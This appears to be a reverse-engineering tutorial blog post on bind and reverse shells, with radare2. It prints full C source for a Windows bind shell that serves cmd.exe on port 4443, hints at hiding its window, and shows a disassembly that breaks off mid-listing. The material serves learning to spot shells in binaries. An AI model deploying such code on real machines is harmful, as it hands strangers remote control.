.subscribe-email:focus{color:rgba(255,255,255,0.8);border-color:#0070ff}.widget-subscribe .subscribe-form .subscribe-button{position:absolute;top:10px;right:10px;height:40px;padding:0 15px;font-size:14px}@media only screen and (max-width: 1130px){.widget-subscribe .subscribe-form .subscribe-email{font-size:13px}.widget-subscribe .subscribe-form .subscribe-button{font-size:14px}}.copyright{padding:0 0 30px;margin-top:10px;font-size:13px;font-weight:500;text-align:center;color:#ccc}.copyright a:hover{color:#0070ff}@media only screen and (max-width: 768px){.copyright{text-align:left}}.gallery-box{margin:40px 0}.gallery-box.gallery-footer{margin:0}.gallery-box em{display:block;margin-top:15px;font-size:14px;line-height:22px;font-style:normal;font-weight:normal;text-align:center;color:#fff}.gallery-box em a{border-bottom:1px solid #fff}.gallery-box em a:hover{color:#fff;border-color:#0070ff}.gallery{display:grid;grid-template-columns:repeat(3, auto);justify-content:center;align-content:center;grid-gap:10px}.gallery .gallery__image{background:#131212}.gallery .gallery__image img{display:block;width:100%;height:auto;object-fit:cover}.social{margin:60px 0 0;text-align:center}.social .social__list{display:flex;justify-content:center;align-items:center;flex-wrap:wrap}.social .social__item{display:inline-block;margin:0 2px}.social .social__link{position:relative;z-index:1;padding:0 10px;font-size:21px;line-height:1}.social .social__link:hover{color:#fff}.social .social__link:hover::after{transform:translate3d(-50%, -50%, 0) scale(1)}.social .social__link::after{content:'';display:block;position:absolute;z-index:-1;top:50%;left:50%;transform:translate3d(-50%, -50%, 0) scale(0);width:100%;height:0;padding-bottom:100%;border-radius:50%;background:#0070ff;transition:all .25s}@media only screen and (max-width: 768px){.social{margin:50px 0 0;text-align:left}.social .social__list{justify-content:start}}.hero{padding:60px 0 70px;margin-bottom:70px;background:#161d25}.hero.hero--post .article__meta{margin-bottom:13px;font-size:14px;font-weight:500}.hero.hero--post .article__meta .article__date::before{content:none}.hero.hero--post .article__author-link{font-size:14px;line-height:20px;font-weight:500;color:#ccc}.hero.hero--post .article__author-link span{color:#ccc}.hero.hero--post .article__author-link:hover{color:#fff}.hero.hero--page .hero__title{margin-bottom:0}@media only screen and (max-width: 768px){.hero{padding:60px 0 60px;margin-bottom:60px}}@media only screen and (max-width: 576px){.hero{padding:40px 0 40px;margin-bottom:40px}}.hero__inner{display:flex;align-items:center}@media only screen and (max-width: 768px){.hero__inner{flex-direction:column}}.hero__left,.hero__right{width:50%}@media only screen and (max-width: 768px){.hero__left,.hero__right{width:100%}}.hero__left .hero__title,.hero__left .hero__job{font-size:50px;font-weight:700;letter-spacing:-2px;color:#fff}@media only screen and (max-width: 1130px){.hero__left .hero__title,.hero__left .hero__job{font-size:40px;line-height:1.2}}@media only screen and (max-width: 1024px){.hero__left .hero__title,.hero__left .hero__job{font-size:33px}}@media only screen and (max-width: 576px){.hero__left .hero__title,.hero__left .hero__job{font-size:27px}}.hero__left .hero__title{margin-right:20px;margin-bottom:10px}@media only screen and (max-width: 768px){.hero__left .hero__title{margin-right:0}}.hero__left .hero__job{margin-bottom:20px}.hero__left .hero__name{position:relative;font-weight:400}.hero__left .hero__name::after{content:"";position:absolute;left:0;bottom:0px;width:100%;height:38%;background-color:rgba(0,112,255,0.1)}.hero__left .hero__description{max-width:550px;margin:0;font-size:21px;font-weight:500;color:#ccc}@media only screen and (max-width: 1024px){.hero__left .hero__description{font-size:16px;line-height:26px}}.hero__left .hero__button{margin-top:20px;padding-right:12px;display:inline-block;font-size:16px;line-height:16px;font-weight:700;color:#fff;outline:none;cursor:pointer;transition:all 0.35s}.hero__left .hero__button:hover{color:#fff;background:#0065e6}.hero__left .hero__button .button-arrow{display:inline-block;margin-right:10px;width:30px;height:30px;line-height:30px;text-align:center;color:#fff;background:#0070ff}.hero__right{position:relative}.hero__right::after{content:"";position:absolute;top:50%;transform:translateY(-50%);display:block;width:100%;height:50%;background-image:-webkit-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-moz-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-ms-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);-webkit-background-size:15px 15px;-moz-background-size:15px 15px;background-size:15px 15px}.hero__right .hero__image{position:relative;z-index:10;width:370px;height:470px;margin:0 auto}.hero__right .hero__image::before{content:"";display:block;position:absolute;top:0;z-index:1;width:100%;height:100%;background:#131212}.hero__right .hero__image img{position:absolute;top:0;z-index:1;height:100%;width:100%;object-fit:cover;box-shadow:10px 10px 0 #0070ff;background:#131212}@media only screen and (max-width: 1130px){.hero__right .hero__image{width:270px;height:370px}}@media only screen and (max-width: 1024px){.hero__right .hero__image{width:230px;height:330px}}@media only screen and (max-width: 768px){.hero__right{order:-1}.hero__right .hero__image{width:100%;height:330px;margin-bottom:40px}}@media only screen and (max-width: 576px){.hero__right .hero__image{height:270px;margin-bottom:30px}.hero__right .hero__image img{box-shadow:none}}.contact-head{margin-bottom:30px}.form-box{max-width:750px;margin:0 auto}.form__group{margin-bottom:20px}.form__group:last-child{margin-bottom:0}.form__input{width:100%;padding:20px;font-size:14px;font-weight:500;border:1px solid #131212;outline:none;transition:250ms;resize:vertical;color:rgba(255,255,255,0.8);background:#161d25}.form__input::placeholder{color:rgba(255,255,255,0.8)}.form__input:focus{border:1px solid #0070ff}.article{margin-bottom:30px;border-radius:3px;overflow:hidden;transition:transform .2s}.article:hover{transform:translateY(-3px)}.article__inner{box-shadow:0px 0px 20px rgba(0,0,0,0.05)}.image-wrap{padding:15px 15px 0 15px;background:#161d25}.article__image{position:relative;display:block;height:0;padding-bottom:56.25%;background:#131212;overflow:hidden}.article__image img{position:absolute;width:100%;height:100%;object-fit:cover}.article__content{padding:25px;background:#161d25}.article__title{margin-bottom:10px;font-size:22px;line-height:32px}.article__title a:hover{color:#fff}.article__excerpt{font-size:15px;line-height:24px;font-weight:500;margin-bottom:20px;color:#ccc}.article__meta{display:flex;align-items:center;flex-wrap:wrap;margin-bottom:10px;font-size:13px;font-weight:500;line-height:20px}.article__meta .article__author-link{color:#ccc}.article__meta .article__author-link:hover{color:#fff}.article__meta .article-tags__box{display:flex}.article__meta .article-tags__box::before{content:"/";display:inline-block;margin:0 5px;color:#ccc}.article__meta .article-tags__box .article__tag{color:#ccc}.article__meta .article-tags__box .article__tag:hover{color:#fff}.article__meta .article-tags__box .article__tag::after{content:",";display:inline-block;margin:0 2px}.article__meta .article-tags__box .article__tag:last-child::after{content:none}.article__meta .article__date{color:#ccc}.article__meta .article__date::before{content:"/";display:inline-block;margin:0 5px;color:#ccc}img[src$="centerme"]{display:block;margin:0 auto}.post,.page{max-width:850px;margin:0 auto;color:#fff}.post__content a,.page__content a{text-decoration:underline}.image-box{margin:40px 0}.post__share{margin:50px 0}.post__share .share__list{display:flex;justify-content:center;align-items:center;width:100%}.post__share .share__item{margin:0 2px;text-align:center}.post__share .share__link{display:block;padding:2px 12px;font-size:18px;color:#161d25}.post__share .share__link.share__facebook,.post__share .share__link.share__twitter,.post__share .share__link.share__linkedin,.post__share .share__link.share__pinterest{border:1px solid #131212;background:#161d25}.post__share .share__link.share__facebook:hover,.post__share .share__link.share__twitter:hover,.post__share .share__link.share__linkedin:hover,.post__share .share__link.share__pinterest:hover{color:#fff}.post__share .share__link.share__facebook{color:#3b5998}.post__share .share__link.share__facebook:hover{background:#3b5998}.post__share .share__link.share__twitter{color:#55acee}.post__share .share__link.share__twitter:hover{background:#55acee}.post__share .share__link.share__linkedin{color:#0077b5}.post__share .share__link.share__linkedin:hover{background:#0077b5}.post__share .share__link.share__pinterest{color:#bd081c}.post__share .share__link.share__pinterest:hover{background:#bd081c}@media only screen and (max-width: 576px){.post__share{margin:40px 0}}.post__navigation{display:flex;justify-content:space-between;margin-bottom:20px}.post__navigation .post__prev,.post__navigation .post__next{display:flex;width:48%;padding:25px;margin-bottom:30px;background:#161d25;box-shadow:0px 0px 20px rgba(0,0,0,0.05);transition:transform .2s}.post__navigation .post__prev:hover,.post__navigation .post__next:hover{transform:translateY(-3px)}.post__navigation .post__prev .prev__image,.post__navigation .post__prev .next__image,.post__navigation .post__next .prev__image,.post__navigation .post__next .next__image{position:relative;display:block;width:100px;min-width:100px;height:100px;background-color:#131212}.post__navigation .post__prev .prev__image img,.post__navigation .post__prev .next__image img,.post__navigation .post__next .prev__image img,.post__navigation .post__next .next__image img{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.post__navigation .post__prev .prev__image,.post__navigation .post__next .prev__image{margin-right:15px}.post__navigation .post__prev .next__image,.post__navigation .post__next .next__image{margin-left:15px}.post__navigation .post__prev .post__nav,.post__navigation .post__next .post__nav{display:inline-block;margin-bottom:5px;font-size:13px;line-height:1;font-weight:500;color:#ccc}.post__navigation .post__prev .post__nav__title,.post__navigation .post__next .post__nav__title{margin-bottom:0;font-size:18px;line-height:24px}.post__navigation .post__prev .post__nav__title a:hover,.post__navigation .post__next .post__nav__title a:hover{color:#fff}.post__navigation .post__next{text-align:right;margin-left:auto;justify-content:flex-end}@media only screen and (max-width: 768px){.post__navigation{flex-wrap:wrap}.post__navigation .post__prev,.post__navigation .post__next{width:100%}.post__navigation .post__prev{margin-bottom:30px}.post__navigation .next__box{margin-left:auto}}@media only screen and (max-width: 576px){.post__navigation{margin-bottom:10px}.post__navigation .post__prev,.post__navigation .post__next{padding:20px}.post__navigation .post__prev .post__nav__title,.post__navigation .post__next .post__nav__title{font-size:15px;line-height:20px}}.post__comments{padding:40px;box-shadow:0px 0px 20px rgba(0,0,0,0.05);background:#161d25}@media only screen and (max-width: 576px){.post__comments{padding:30px}}.error{margin-bottom:30px;text-align:center}.error .error__title{margin-bottom:0;font-size:100px}.error .error__text{margin-bottom:20px;font-size:21px;color:#ccc}.error .error__button{line-height:45px}.tag{padding:70px 0;margin-bottom:70px;text-align:center;background:#161d25}.tag .tag__meta{font-size:16px;color:#ccc}.tag .tag__title{margin:0;font-size:50px}@media only screen and (max-width: 768px){.tag{padding:60px 0;margin-bottom:60px}}@media only screen and (max-width: 576px){.tag{padding:40px 0;margin-bottom:40px}}
+
+  </style>
+</head>
+
+<body class="dark">
+
+  
+
+    <!-- begin header -->
+<header class="header">
+  <div class="container">
+    <div class="row">
+      <div class="header__inner col col-12">
+
+        <div class="logo">
+          <a class="logo__link" href="/">
+          
+            Artik Blue
+          
+          </a>
+        </div>
+
+        <nav class="main-nav">
+          <div class="main-nav__box">
+            <div class="nav__icon-close">
+              <i class="ion ion-md-close"></i>
+            </div>
+            <div class="nav__title">Menu</div>
+            <ul class="nav__list list-reset">
+              <li class="nav__item">
+                <a href="/" class="nav__link">Home</a>
+              </li>
+              
+                
+              
+                
+                  
+                  <li class="nav__item">
+                    <a href="/about/" class="nav__link">About</a>
+                  </li>
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                  <li class="nav__item">
+                    <a href="/reversing" class="nav__link">Reversing</a>
+                  </li>
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+            </ul>
+          </div>
+        </nav>
+
+        <div class="nav-buttons">
+          <i class="nav__icon nav__icon-menu ion ion-md-menu"></i>
+          <i class="nav__icon nav__icon-search ion ion-md-search"></i>
+        </div>
+
+      </div>
+    </div>
+  </div>
+  <div class="header__overlay"></div>
+</header>
+<!-- end header -->
+
+<!-- begin search -->
+<div class="search">
+  <div class="container">
+    <div class="row">
+      <div class="col col-12">
+        <div class="search__box">
+          <div class="search__group">
+            <div class="search__close">
+              <i class="ion ion-md-close"></i>
+            </div>
+            <label for="js-search-input" class="screen-reader-text">Search for Blog</label>
+            <input type="text" id="js-search-input" class="search__text" autocomplete="off" placeholder="Type to search...">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="row">
+      <div class="col col-12">
+        <div class="container__inner">
+          <div class="row search-results-list" id="js-results-container"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+<!-- end search -->
+    <!-- begin content -->
+    <main class="content" aria-label="Content">
+      <!-- begin wrapper-page -->
+      <div class="wrapper-page">
+        <!-- begin hero -->
+
+<section class="hero hero--post">
+  <div class="container">
+    <div class="row">
+      <div class="col col-12">
+        <div class="hero__inner">
+          <div class="hero__left">
+            
+
+            <div class="article__meta">
+              <span class="article__date"><time datetime="2020-06-14T00:01:35+02:00">14 Jun 2020</time></span>
+              
+              <div class="article-tags__box">
+                
+                  <a href="/tag/reversing" class="article__tag">reversing</a>
+                
+                  <a href="/tag/c" class="article__tag">c</a>
+                
+                  <a href="/tag/radare" class="article__tag">radare</a>
+                
+              </div>
+              
+            </div>
+
+            <h1 class="hero__title">Reverse engineering x64 binaries with Radare2 - 18 (Bind and reverse shells)</h1>
+            <a href="/about/" class="article__author-link"><span>By</span> Artik Blue</a>
+
+            
+          </div>
+
+          <div class="hero__right">
+
+            
+            <div class="hero__image">
+              <img class="lazy" data-src="/images//radare2/radare2_18.png" alt="Reverse engineering x64 binaries with Radare2 - 18 (Bind and reverse shells)">
+            </div>
+
+            
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- end hero -->
+
+<!-- begin post -->
+<div class="container">
+  <article class="post animate">
+
+    <div class="post__content">
+      <h4 id="shells">“Shells”</h4>
+
+<p>Today I wanto to introduce a small and simple idea, to complement what we’ve been learning on these past posts.</p>
+
+<p>We’ve been emulating protocols as well as defining new protocols ourselves, that’s nice but what if we don’t want no protocol at all, can we just dump a file or process output to a socket and make the whole thing more “ automatic “</p>
+
+<p>Actually yes, processes (input and output) can get “sent” over network sockets in both linux and windows systems. Bind and reverse shells are common concepts among the hacking lands.</p>
+
+<p>So in this post I do not intend to teach you advanced reverse engineering conceptes or new radare2 features I just want to introduce you to the bind/reverse shell code and operation so you can implement it yourself or quickly identify it on the disasm.</p>
+
+<h4 id="the-bind-shell">The bind shell</h4>
+
+<p>What is a bind shell? Again when we talk about bind/reverse shells in terms of pentesting/hacking/exploiting and such a bind shell is a program or a piece of code that opens a port on the machine where it is executed and starts accepting connections there, once the client connection is accepted the program will provide “the client” with a <em>remote</em> command line interface.</p>
+
+<p>Shells like the bind-shell are used in pentesting and hacking in general to take over remote machines. bind/reverse shells can be used as the <em>payload</em> of an exploit “weaponizing” it, so when it kicks in the “hacker” will get control of the machine. That is an easy but at the same time fundamental concept, you really need to have this very clear as if you are a pentester you’ll always want to get a shell on the remote machine, that’ll be one of your main goals for sure.</p>
+
+<p>Plenty of bind / reverse shell shellcode is available online, as you already know we can insert that shellcode inside a simple C program  using the trick we previously showed, we can also generate som shellcode in many formats using platforms like the metasploit framework and such, but the key thing here is that we should be able to write our bind/reverse shell code ourselves and especially we must be able to identify it and understand it when reversing a program.</p>
+
+<p>The following program is an example of a BIND shell written in C using the WINSOCK and WINDOWS libraries:</p>
+<pre><code class="language-C">#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;ws2tcpip.h&gt;
+
+#pragma comment(lib,"ws2_32")
+
+void doShell(){
+
+    // needed data structures
+    WSADATA wsaData;
+    SOCKET s1, s2;
+    struct sockaddr_in hax;
+    char ip_addr[16];
+    STARTUPINFO sui;
+    PROCESS_INFORMATION pi;
+    //command we want to run, any other command line program could be used, but we want to prompt a shell.
+    char Process[] = "cmd.exe";
+    //WSAStartup is needed for socket 
+	WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
+    //We can use socket() either 
+    //so INET TCP socket 
+	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+    port 4443 on all interfaces
+	hax.sin_family = AF_INET;
+	hax.sin_port = htons(4443);
+	hax.sin_addr.s_addr = inet_addr("0.0.0.0");
+    //bind the socket to the address:port 
+    if(bind(s1,(SOCKADDR*)&amp;hax, sizeof(hax)) == SOCKET_ERROR){
+		    printf("error %d \n", WSAGetLastError());
+			closesocket(s1);
+			WSACleanup();
+    }
+    //now the port will be open 
+	else if(listen(s1,10) == SOCKET_ERROR){
+		    printf("error %d \n", WSAGetLastError());
+			closesocket(s1);
+			WSACleanup();
+    }
+    else{
+        //we set up a new socket here
+        s2 = accept(s1, NULL, NULL);
+
+        // we'll  use s2 to SEND data ourselves to the client
+        printf("connecting \n");
+        // we get the processinfo struct ready
+        memset(&amp;sui, 0, sizeof(sui));
+        sui.cb = sizeof(sui);
+        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+        // this is the key concept here, all the input/output of the interaction with this proces will go from/to client socket
+        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s2;
+        // we create the socket with that data
+        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &amp;sui, &amp;pi);
+        // we don't want the program to end after this, we want to keep the connection going until cmd.exe finishes
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        // house cleaning
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        closesocket(s1);
+        closesocket(s2);
+        WSACleanup();
+        printf("shell closed \n");
+    }
+
+}
+
+int main(int argc, char* argv[]){
+
+    printf("bind shell going on: \n");
+    doShell();
+
+}
+</code></pre>
+<p>So the program will open port 4443 TCP for listening on all interfaces, will accept connections there and prompt a cmd.exe shell.</p>
+
+<p>The key concept here, is the StartupInfo structure, that gets passed to the CreateProcess call (as we just saw with the reverse shell)</p>
+
+<p>That is the following:</p>
+<pre><code class="language-C">typedef struct _STARTUPINFOA {
+  DWORD  cb;
+  LPSTR  lpReserved;
+  LPSTR  lpDesktop;
+  LPSTR  lpTitle;
+  DWORD  dwX;
+  DWORD  dwY;
+  DWORD  dwXSize;
+  DWORD  dwYSize;
+  DWORD  dwXCountChars;
+  DWORD  dwYCountChars;
+  DWORD  dwFillAttribute;
+  DWORD  dwFlags;
+  WORD   wShowWindow;
+  WORD   cbReserved2;
+  LPBYTE lpReserved2;
+  HANDLE hStdInput;
+  HANDLE hStdOutput;
+  HANDLE hStdError;
+} STARTUPINFOA, *LPSTARTUPINFOA;
+</code></pre>
+<p>And especially those three variables right there:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  HANDLE hStdInput;
+  HANDLE hStdOutput;
+  HANDLE hStdError;
+</code></pre></div></div>
+<p>Those are the handles that relate to the input and output of the created process. And the key thing here is that those handles are related to where the input/output of the program will be sent/get to/from</p>
+
+<p>If we place our (client) socket there… everything will go over the network instead of over a console window</p>
+
+<p>We also have other interesting properties such as the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  WORD   wShowWindow;
+</code></pre></div></div>
+<p>When set to 0 CreateProcess will NOT create a Window… that may be useful for you if you think about it…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x00401550]&gt; pdf
+/ (fcn) sym.doShell 656
+|   sym.doShell (int arg_3ch, int arg_50h, int arg_58h, int arg_60h, int arg_80h, int arg_82h, int arg_84h, int arg_90h, int arg_230h, int arg_238h);
+|           ; var int local_28h @ rbp-0x28
+|           ; var int local_20h_2 @ rbp-0x20
+|           ; var int local_18h @ rbp-0x18
+|           ; arg int arg_3ch @ rbp+0x3c
+|           ; arg int arg_50h @ rbp+0x50
+|           ; arg int arg_58h @ rbp+0x58
+|           ; arg int arg_60h @ rbp+0x60
+|           ; arg int arg_80h @ rbp+0x80
+|           ; arg int arg_82h @ rbp+0x82
+|           ; arg int arg_84h @ rbp+0x84
+|           ; arg int arg_90h @ rbp+0x90
+|           ; arg int arg_230h @ rbp+0x230
+|           ; arg int arg_238h @ rbp+0x238
+|           ; var int local_20h @ rsp+0x20
+|           ; var int local_28h_2 @ rsp+0x28
+|           ; var int local_30h @ rsp+0x30
+|           ; var int local_38h @ rsp+0x38
+|           ; var int local_40h @ rsp+0x40
+|           ; var int local_48h @ rsp+0x48
+|           ; var int local_80h @ rsp+0x80
+|           ; CALL XREF from 0x00401800 (sym.main)
+|           0x00401550      55             push rbp
+|           0x00401551      4881ecc00200.  sub rsp, 0x2c0
+|           0x00401558      488dac248000.  lea rbp, [local_80h]        ; 0x80 ; 128
+|           0x00401560      48b8636d642e.  movabs rax, 0x6578652e646d63
+|           0x0040156a      488945d8       mov qword [local_28h], rax
+|           0x0040156e      488d85900000.  lea rax, [arg_90h]          ; 0x90 ; 144
+|           0x00401575      4889c2         mov rdx, rax
+|           0x00401578      b902020000     mov ecx, 0x202              ; 514
+|           0x0040157d      488b05fc6c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x408280:8]=0x84ae reloc.WS2_32.dll_WSAStartup
+|           0x00401584      ffd0           call rax
+|           0x00401586      c74424280000.  mov dword [local_28h_2], 0
+|           0x0040158e      c74424200000.  mov dword [local_20h], 0
+|           0x00401596      41b900000000   mov r9d, 0
+|           0x0040159c      41b806000000   mov r8d, 6
+|           0x004015a2      ba01000000     mov edx, 1
+|           0x004015a7      b902000000     mov ecx, 2
+|           0x004015ac      488b05c56c00.  mov rax, qword sym.imp.WS2_32.dll_WSASocketA ; [0x408278:8]=0x84a0 reloc.WS2_32.dll_WSASocketA
+|           0x004015b3      ffd0           call rax
+|           0x004015b5      488985380200.  mov qword [arg_238h], rax   ; [0x238:8]=-1 ; 568
+|           0x004015bc      66c785800000.  mov word [arg_80h], 2       ; [0x80:2]=0xffff ; 2
+|           0x004015c5      b95c110000     mov ecx, 0x115c
+|           0x004015ca      488b05cf6c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x4082a0:8]=0x84dc reloc.WS2_32.dll_htons
+|           0x004015d1      ffd0           call rax
+|           0x004015d3      668985820000.  mov word [arg_82h], ax      ; [0x82:2]=0xffff ; 130
+|           0x004015da      488d0d1f2a00.  lea rcx, str.0.0.0.0        ; section..rdata ; 0x404000 ; "0.0.0.0"
+|           0x004015e1      488b05c06c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x4082a8:8]=0x84e4 reloc.WS2_32.dll_inet_addr
+|           0x004015e8      ffd0           call rax
+|           0x004015ea      898584000000   mov dword [arg_84h], eax    ; [0x84:4]=-1 ; 132
+|           0x004015f0      488d85800000.  lea rax, [arg_80h]          ; 0x80 ; 128
+|           0x004015f7      488b8d380200.  mov rcx, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|           0x004015fe      41b810000000   mov r8d, 0x10               ; 16
+|           0x00401604      4889c2         mov rdx, rax
+|           0x00401607      488b05826c00.  mov rax, qword sym.imp.WS2_32.dll_bind ; [0x408290:8]=0x84c6 reloc.WS2_32.dll_bind
+|           0x0040160e      ffd0           call rax
+|           0x00401610      83f8ff         cmp eax, 0xffffffffffffffff
+|       ,=&lt; 0x00401613      7538           jne 0x40164d
+|       |   0x00401615      488b05546c00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x408270:8]=0x848e reloc.WS2_32.dll_WSAGetLastError
+|       |   0x0040161c      ffd0           call rax
+|       |   0x0040161e      89c2           mov edx, eax
+|       |   0x00401620      488d0de12900.  lea rcx, str.error__d       ; 0x404008 ; "error %d \n"
+|       |   0x00401627      e81c170000     call sym.printf             ; int printf(const char *format)
+|       |   0x0040162c      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|       |   0x00401633      4889c1         mov rcx, rax
+|       |   0x00401636      488b055b6c00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408298:8]=0x84ce reloc.WS2_32.dll_closesocket
+|       |   0x0040163d      ffd0           call rax
+|       |   0x0040163f      488b05226c00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408268:8]=0x8480 reloc.WS2_32.dll_WSACleanup
+|       |   0x00401646      ffd0           call rax
+|      ,==&lt; 0x00401648      e989010000     jmp 0x4017d6
+|      ||   ; JMP XREF from 0x00401613 (sym.doShell)
+|      |`-&gt; 0x0040164d      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|      |    0x00401654      ba0a000000     mov edx, 0xa
+|      |    0x00401659      4889c1         mov rcx, rax
+|      |    0x0040165c      488b054d6c00.  mov rax, qword sym.imp.WS2_32.dll_listen ; [0x4082b0:8]=0x84f0 reloc.WS2_32.dll_listen
+|      |    0x00401663      ffd0           call rax
+|      |    0x00401665      83f8ff         cmp eax, 0xffffffffffffffff
+|      |,=&lt; 0x00401668      7538           jne 0x4016a2
+|      ||   0x0040166a      488b05ff6b00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x408270:8]=0x848e reloc.WS2_32.dll_WSAGetLastError
+|      ||   0x00401671      ffd0           call rax
+|      ||   0x00401673      89c2           mov edx, eax
+|      ||   0x00401675      488d0d8c2900.  lea rcx, str.error__d       ; 0x404008 ; "error %d \n"
+|      ||   0x0040167c      e8c7160000     call sym.printf             ; int printf(const char *format)
+|      ||   0x00401681      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|      ||   0x00401688      4889c1         mov rcx, rax
+|      ||   0x0040168b      488b05066c00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408298:8]=0x84ce reloc.WS2_32.dll_closesocket
+|      ||   0x00401692      ffd0           call rax
+|      ||   0x00401694      488b05cd6b00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408268:8]=0x8480 reloc.WS2_32.dll_WSACleanup
+|      ||   0x0040169b      ffd0           call rax
+|     ,===&lt; 0x0040169d      e934010000     jmp 0x4017d6
+|     |||   ; JMP XREF from 0x00401668 (sym.doShell)
+|     ||`-&gt; 0x004016a2      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
+|     ||    0x004016a9      41b800000000   mov r8d, 0
+|     ||    0x004016af      ba00000000     mov edx, 0
+|     ||    0x004016b4      4889c1         mov rcx, rax
+|     ||    0x004016b7      488b05ca6b00.  mov rax, qword sym.imp.WS2_32.dll_accept ; [0x408288:8]=0x84bc reloc.WS2_32.dll_accept
+|     ||    0x004016be      ffd0           call rax
+|     ||    0x004016c0      488985300200.  mov qword [arg_230h], rax   ; [0x230:8]=-1 ; 560
+|     ||    0x004016c7      488d0d452900.  lea rcx, str.connecting     ; 0x404013 ; "connecting "
+|     ||    0x004016ce      e86d160000     call sym.puts               ; int puts(const char *s)
+|     ||    0x004016d3      4889e8         mov rax, rbp
+|     ||    0x004016d6      41b868000000   mov r8d, 0x68               ; 'h' ; 104
+|     ||    0x004016dc      ba00000000     mov edx, 0
+|     ||    0x004016e1      4889c1         mov rcx, rax
+|     ||    0x004016e4      e867160000     call sym.memset             ; void *memset(void *s, int c, size_t n)
+|     ||    0x004016e9      c74500680000.  mov dword [rbp], 0x68       ; 'h' ; 104
+|     ||    0x004016f0      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
+|     ||    0x004016f7      488b85300200.  mov rax, qword [arg_230h]   ; [0x230:8]=-1 ; 560
+|     ||    0x004016fe      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
+|     ||    0x00401702      488b4560       mov rax, qword [arg_60h]    ; [0x60:8]=-1 ; '`' ; 96
+|     ||    0x00401706      48894558       mov qword [arg_58h], rax    ; [0x58:8]=-1 ; 'X' ; 88
+|     ||    0x0040170a      488b4558       mov rax, qword [arg_58h]    ; [0x58:8]=-1 ; 'X' ; 88
+|     ||    0x0040170e      48894550       mov qword [arg_50h], rax    ; [0x50:8]=-1 ; 'P' ; 80
+|     ||    0x00401712      488d45d8       lea rax, [local_28h]
+|     ||    0x00401716      488d55e0       lea rdx, [local_20h_2]
+|     ||    0x0040171a      4889542448     mov qword [local_48h], rdx
+|     ||    0x0040171f      4889ea         mov rdx, rbp
+|     ||    0x00401722      4889542440     mov qword [local_40h], rdx
+|     ||    0x00401727      48c744243800.  mov qword [local_38h], 0
+|     ||    0x00401730      48c744243000.  mov qword [local_30h], 0
+|     ||    0x00401739      c74424280000.  mov dword [local_28h_2], 0
+|     ||    0x00401741      c74424200100.  mov dword [local_20h], 1
+|     ||    0x00401749      41b900000000   mov r9d, 0
+|     ||    0x0040174f      41b800000000   mov r8d, 0
+|     ||    0x00401755      4889c2         mov rdx, rax
+|     ||    0x00401758      b900000000     mov ecx, 0
+|     ||    0x0040175d      488b05646b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082c8:8]=0x8508 reloc.KERNEL32.dll_CreateProcessA
+|     ||    0x00401764      ffd0           call rax
+|     ||    0x00401766      488b45e0       mov rax, qword [local_20h_2]
